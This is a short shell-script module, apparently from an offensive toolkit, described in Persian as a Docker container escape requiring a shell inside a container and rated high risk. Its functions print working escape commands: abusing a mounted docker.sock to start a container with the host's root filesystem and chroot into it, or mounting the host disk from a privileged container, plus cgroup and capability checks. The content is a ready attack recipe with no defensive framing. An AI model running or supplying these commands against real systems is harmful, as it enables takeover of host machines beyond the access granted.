DESC="فرار از کانتینر داکر"
REQ="shell داخل کانتینر"
RISK="HIGH"

termux(){ echo "ls -la /var/run/docker.sock"; }

kali(){
cat <<'EOF'
id; ls -la /var/run/docker.sock
# اگر سوکت مانت بود:
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
# اگر privileged بود:
mount /dev/sda1 /mnt && chroot /mnt
cat /proc/1/cgroup
capsh --print
EOF
}
